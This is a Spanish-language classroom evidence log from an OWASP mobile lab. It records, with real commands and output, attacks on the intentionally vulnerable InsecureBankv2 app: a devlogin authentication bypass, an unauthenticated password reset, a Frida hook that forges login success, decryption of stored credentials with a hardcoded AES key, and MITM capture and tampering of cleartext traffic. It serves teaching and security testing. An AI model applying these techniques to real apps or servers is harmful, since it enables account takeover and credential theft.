# Clase 2 — Evidencia

Transcripción de la verificación de la Clase 2 (M3, M4, M5, M7) contra el
entorno real del laboratorio.

| | |
|---|---|
| **Fecha** | 1 de octubre de 2026 |
| **Servidor** | `172.25.208.104/24` (Ubuntu, `systemd` real) |
| **VM Android** | `172.25.208.100:5555` — Android 8.1.0, API 27, `x86_64`, root por ADB |
| **Backend** | `insecurebankv2-server` activo en `0.0.0.0:8888` |
| **Cliente Frida** | 17.19.0 |
| **Resultado** | Todas las fases verificadas, salvo 1.5 si `frida-server` no está en la VM |

Cada sección indica el comando ejecutado y la salida **real** obtenida.

---

## 0 — Preparación

### Entorno

```console
$ ping -c2 172.25.208.100
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 1.302/1.431/1.561/0.129 ms
```

```console
$ adb connect 172.25.208.100:5555
connected to 172.25.208.100:5555
```

```console
$ vmconnect
==> Conectando con 172.25.208.100:5555 ...
already connected to 172.25.208.100:5555

  Dispositivo : Standard PC (i440FX + PIIX, 1996)
  Android     : 8.1.0 (API 27)
  ABI         : x86_64
  Sesión ADB  : uid=0(root)  <- 'uid=0(root)' es lo ideal
```

### Backend

```console
$ curl -s -X POST --data-urlencode 'username=dinesh' \
       --data-urlencode 'password=Dinesh@123$' http://127.0.0.1:8888/login
{"message": "Correct Credentials", "user": "dinesh"}
```

### Descompilación

```console
$ jadx ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk \
       -d ~/mobile-owasp-lab/reports/jadx/InsecureBankv2
INFO  - done
real	0m31.274s
```

2291 clases. Tarda unos 30 segundos.

---

## 1 — M3: Autenticación insegura

### 1.1 `/devlogin` no valida nada — VERIFICADO

Código real (`app.py:128`):

```python
@app.route('/devlogin', methods=['POST'])
def devlogin():
    user=request.form['username']
    Responsemsg="Correct Credentials"
    data = {"message" : Responsemsg, "user": user}
    print(makejson(data))
    return makejson(data)
```

Con cualquier contraseña:

```console
$ for p in "" "x" "esta-no-es-la-contraseña"; do
    printf '  devadmin / %-26s -> ' "\"$p\""
    curl -s -X POST --data-urlencode "username=devadmin" \
         --data-urlencode "password=$p" http://127.0.0.1:8888/devlogin
    echo
  done
  devadmin / ""                          -> {"message": "Correct Credentials", "user": "devadmin"}
  devadmin / "x"                         -> {"message": "Correct Credentials", "user": "devadmin"}
  devadmin / "esta-no-es-la-contraseña"  -> {"message": "Correct Credentials", "user": "devadmin"}
```

Usuario inexistente:

```console
$ curl -s -X POST -d 'username=usuario-fantasma&password=x' \
       http://127.0.0.1:8888/devlogin
{"message": "Correct Credentials", "user": "usuario-fantasma"}
```

### 1.1 (cont.) Bypass end-to-end en la app real — VERIFICADO

El cliente elige endpoint (`DoLogin.java:103`):

```java
if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);
}
```

Login en la app con usuario `devadmin` y contraseña `inventada999`:

```console
$ adb shell dumpsys window | grep mCurrentFocus
    mCurrentFocus=Window{72fc604 u0 com.android.insecurebankv2/com.android.insecurebankv2.PostLogin}
```

UI resultante:

```console
$ adb shell uiautomator dump /sdcard/ui.xml && adb shell cat /sdcard/ui.xml
text="PostLogin"
text="Transfer"
text="View Statement"
text="Change Password"
text="Rooted Device!!"
```

Log de M6 con la credencial falsa aceptada:

```console
$ adb logcat -d | grep "Successful Login"
10-01 15:18:40.807  4417  4437 D Successful Login:: , account=devadmin:inventada999
```

Base de datos de la app:

```console
$ sqlite3 mydb.db "select * from names;"
7|devadmin
```

Credenciales falsas guardadas (`mySharedPreferences.xml`):

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">FXYA/8Ki33dG4NlHsGlAtQ==&#10;    </string>
    <string name="EncryptedUsername">ZGV2YWRtaW4=&#13;&#10;    </string>
</map>
```

Descifrado con la clave de M1/M4:

```console
$ venv/bin/python - <<'PY'
... AES.new(b"This is the super secret key 123", AES.MODE_CBC, b"\x00"*16) ...
PY
  superSecurePassword -> inventada999
  'EncryptedUsername' -> devadmin (solo Base64)
```

### 1.2 `/changepassword` sin contraseña actual — VERIFICADO

Código real (`app.py:73`): no hay comparación con la contraseña actual.

Estado previo:

```console
$ sqlite3 mydb.db "select username,password from users;"
dinesh|Dinesh@123$
jack|Jack@123$
```

Cambio sin conocer la contraseña de `dinesh`:

```console
$ curl -s -X POST -d 'username=dinesh&newpassword=RESETEADA-123&password=lo-que-sea' \
       http://127.0.0.1:8888/changepassword
{"message": "Change Password Successful"}
```

```console
$ sqlite3 mydb.db "select username,password from users;"
dinesh|RESETEADA-123
jack|Jack@123$
```

Login con la contraseña elegida por el atacante:

```console
$ curl -s -X POST --data-urlencode 'username=dinesh' \
       --data-urlencode 'password=RESETEADA-123' http://127.0.0.1:8888/login
{"message": "Correct Credentials", "user": "dinesh"}
```

**Restauración** (el laboratorio debe quedar intacto):

```console
$ curl -s -X POST -d 'username=dinesh&newpassword=Dinesh@123$&password=x' \
       http://127.0.0.1:8888/changepassword
{"message": "Change Password Successful"}
$ sqlite3 mydb.db "select username,password from users;"
dinesh|Dinesh@123$
jack|Jack@123$
```

### 1.3 Sin rate limiting — VERIFICADO

```console
$ grep -cE "sleep|rate|limit|attempt|lockout|captcha" app.py
0
```

Cinco intentos rechazados seguidos, sin consecuencia:

```console
  intento 1: {"message": "Wrong Password", "user": "dinesh"}
  intento 2: {"message": "Wrong Password", "user": "dinesh"}
  intento 3: {"message": "Wrong Password", "user": "dinesh"}
  intento 4: {"message": "Wrong Password", "user": "dinesh"}
  intento 5: {"message": "Wrong Password", "user": "dinesh"}
```

### 1.4 La decisión de acceso es un `indexOf` — VERIFICADO

`DoLogin.java:112-118`:

```java
DoLogin.this.result = convertStreamToString(in);
if (DoLogin.this.result != null) {
    if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
        Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
```

No existe ningún método `checkCredentials` en el código (el guion anterior lo
buscaba).

### 1.5 Bypass con Frida — VERIFICADO

Preparación en la VM (`vmconnect frida` guía el resto):

```console
$ frida-ps -Uai | grep -i insecurebank
   -  InsecureBankv2     com.android.insecurebankv2
```

Login en la app con `dinesh` / `CLAVE-MALISIMA-XYZ`:

```console
$ frida -U -f com.android.insecurebankv2 -l docs/clases/hook-m3-bypass.js
Spawned `com.android.insecurebankv2`. Resuming main thread!
[*] Hook M3 instalado en DoLogin$RequestTask.convertStreamToString
[*] Hecho. Haz login en la app con cualquier usuario y cualquier clave.
[MITM] Respuesta REAL del backend: {"message": "Wrong Password", "user": "dinesh"}

[MITM] Respuesta FORZADA:              {"message": "Correct Credentials", "user": "inyectado-por-frida"}
[MITM] La app acaba de aceptar un login que el backend NUNCA aprobo.
```

App en `PostLogin`:

```console
    mCurrentFocus=Window{...com.android.insecurebankv2/com.android.insecurebankv2.PostLogin}
```

Log M6:

```console
10-01 15:21:30.052  4620  4644 D Successful Login:: , account=dinesh:CLAVE-MALISIMA-XYZ
```

Base de datos de la app:

```console
7|devadmin
8|dinesh
```

**Nota:** `frida --no-pause` **no existe** en Frida 16+; el proceso falla con
`unrecognized arguments`. En esta versión la app se reanuda sola.

---

## 2 — M4: Criptografía insuficiente — VERIFICADO

Clave e IV (`CryptoClass.java:22-23`):

```java
String key = "This is the super secret key 123";
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
```

Modo de operación (`CryptoClass.java:28`):

```java
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

Descifrado de `superSecurePassword`:

```console
$ venv/bin/python - <<'PY'
... AES.new(b"This is the super secret key 123", AES.MODE_CBC, b"\x00"*16) ...
PY
Dinesh@123$
```

Firma de la APK — **hallazgo nuevo de esta clase**:

```console
$ apksigner verify --verbose ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Verified using v3 scheme (APK Signature Scheme v3): false
Verified using v3.1 scheme (APK Signature Scheme v3.1): false
Verified using v4 scheme (APK Signature Scheme v4): false
```

Sólo firma v1 → vulnerable a Janus (CVE-2017-13156) en Android 5.0–8.0. La VM
es Android 8.1, dentro del rango afectado.

---

## 3 — M5: Comunicación insegura — VERIFICADO

Protocolo hardcodeado:

```console
$ grep -rn 'String protocol' sources/com/android/insecurebankv2/*.java
ChangePassword.java:57:    String protocol = "http://";
DoLogin.java:51:    String protocol = "http://";
DoTransfer.java:65:    String protocol = "http://";
```

### 3.2 Tráfico real capturado

Proxy: `python3 docs/clases/mitm-m5.py --port 8080 --target 127.0.0.1:8888`

```console
$ adb shell settings put global http_proxy 172.25.208.104:8080
```

Login en la app con `dinesh` / `Dinesh@123$`:

```console
[MITM] Conexion entrante desde 172.25.208.100
[MITM] POST /login  ->  172.25.208.104:8888

[MITM] Cabeceras de la peticion (la app NO usa HTTPS):
    Content-Length: 40
    Content-Type: application/x-www-form-urlencoded
    Host: 172.25.208.104:8888
    Connection: Keep-Alive
    User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

[MITM] Cuerpo de la peticion:  (40 bytes)
    username=dinesh
    password=Dinesh%40123%24   <-- CONTRASENA EN CLARO, sin cifrar
```

Contraseña en claro, petición de la app real.

### 3.3 Alteración del tráfico en vuelo

Proxy: `python3 docs/clases/mitm-m5.py --port 8080 --target 127.0.0.1:8888 --tamper`

Login en la app con `dinesh` / `CLAVE-XYZ` (contraseña **incorrecta**):

```console
[MITM] Peticion ALTERADA: el usuario dinesh se ha cambiado por jack.
[MITM] Content-Length ajustado: 40 -> 38
[MITM] El backend no tiene ninguna forma de detectar que la peticion viene de un intermediario.

[MITM] Cuerpo de la respuesta:  (44 bytes)
    {"message": "Wrong Password", "user": "jack"}

[MITM] Respuesta ALTERADA:
[MITM]   real del backend: {"message": "Wrong Password", "user": "jack"}
[MITM]   servida a la app:  {"message": "Correct Credentials", "user": "jack"}
[MITM]   Un login FALLIDO acaba de convertirse en uno exitoso sin tocar el servidor.
```

App acepta el login alterado:

```console
    mCurrentFocus=Window{...com.android.insecurebankv2/com.android.insecurebankv2.PostLogin}
```

Log M6 registra la clave falsa como aceptada:

```console
10-01 15:30:12.114  5445  5481 D Successful Login:: , account=dinesh:CLAVE-XYZ
```

Base de datos de la app:

```console
7|devadmin
8|dinesh
9|dinesh
10|dinesh
```

---

## 4 — M7: Calidad de código del cliente — VERIFICADO

### Configuración de depuración

```console
$ grep -oE 'android:(debuggable|allowBackup)="[^"]*"' resources/AndroidManifest.xml
android:debuggable="true"
android:allowBackup="true"
```

### Permisos

```console
$ aapt dump permissions ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk
package: com.android.insecurebankv2
uses-permission: name='android.permission.INTERNET'
uses-permission: name='android.permission.WRITE_EXTERNAL_STORAGE'
...
```

12 permisos declarados, **8 peligrosos**: `SEND_SMS`, `READ_CONTACTS`,
`READ_CALL_LOG`, `READ_PHONE_STATE`, `GET_ACCOUNTS`,
`ACCESS_COARSE_LOCATION`, `READ_EXTERNAL_STORAGE`,
`WRITE_EXTERNAL_STORAGE`.

### SDK

```console
$ aapt dump badging ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk | grep sdkVersion
sdkVersion:'15'
targetSdkVersion:'22'
```

---

## 5 — Nota sobre el log del backend

El backend **sí** registra contraseñas (`app.py:85`, `print(newpassword)`), pero
no aparecen en `journalctl` durante las pruebas. Motivo: **Python bloquea
stdout en bloques de 4–8 KB cuando no hay terminal**, así que los mensajes
llegan al journal a trozos, cuando el buffer se llena.

Comprobado:

```console
$ grep -c "StandardOutput" /etc/systemd/system/insecurebankv2-server.service
0
```

El servicio usa la salida por defecto de systemd (journal), y la bufferización
de Python impide el log en vivo. Para verlo, hay que arrancar con
`PYTHONUNBUFFERED=1`.

Esto es relevante para la clase: si se pide a un alumno que busque la
contraseña en el log del backend con `journalctl -f`, no la verá y puede
concluir que el backend no registra. **Es una trampa de la herramienta, no un
hallazgo ausente.**

---

## Resumen de hallazgos verificados

| # | Riesgo | Ubicación | Estado |
|---|---|---|---|
| 1 | M3 `/devlogin` sin validación | `app.py:128` | VERIFICADO |
| 2 | M3 Bypass devlogin en la app | `DoLogin.java:103` | VERIFICADO (E2E) |
| 3 | M3 `/changepassword` sin pass actual | `app.py:73` | VERIFICADO |
| 4 | M3 Sin rate limiting | `app.py` (todo) | VERIFICADO |
| 5 | M3 Bypass con Frida | `convertStreamToString` | VERIFICADO (E2E) |
| 6 | M4 Clave hardcodeada | `CryptoClass.java:22` | VERIFICADO |
| 7 | M4 IV de ceros | `CryptoClass.java:23` | VERIFICADO |
| 8 | M4 CBC sin MAC | `CryptoClass.java:28` | VERIFICADO |
| 9 | M4 Firma sólo v1 (Janus) | APK | VERIFICADO |
| 10 | M5 HTTP plano | `DoLogin.java:51` | VERIFICADO |
| 11 | M5 Credenciales en claro | tráfico capturado | VERIFICADO |
| 12 | M5 Respuesta alterable | tráfico capturado | VERIFICADO (E2E) |
| 13 | M6 Backend registra en log | `app.py:85` | VERIFICADO (buffer) |
| 14 | M7 debuggable + allowBackup | Manifest | VERIFICADO |
| 15 | M7 8 permisos peligrosos | Manifest | VERIFICADO |
| 16 | M7 minSdk 15 / targetSdk 22 | APK | VERIFICADO |